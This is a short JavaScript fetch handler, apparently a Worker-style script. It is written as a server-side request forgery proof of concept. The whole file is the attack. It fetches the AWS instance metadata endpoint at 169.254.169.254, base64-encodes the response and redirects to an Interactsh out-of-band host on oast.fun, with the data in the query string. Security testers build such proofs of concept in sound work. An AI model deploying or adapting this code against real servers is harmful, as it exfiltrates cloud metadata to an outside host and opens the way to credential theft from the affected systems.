export default {
  async fetch(request) {
    // 1. Redirect the server to AWS metadata
    const awsMetadataUrl = "http://169.254.169.254/latest/meta-data/hostname";
    
    // 2. Fetch the metadata (server will do this internally)
    const metadataResponse = await fetch(awsMetadataUrl);
    const data = await metadataResponse.text();

    // 3. Redirect AGAIN to Interactsh with the data
    const interactshUrl = `https://bjgibppjensgmxvguqwdfbtbu11f2es3z.oast.fun/leak?data=${btoa(data)}`;
    return Response.redirect(interactshUrl, 302);
  }
};
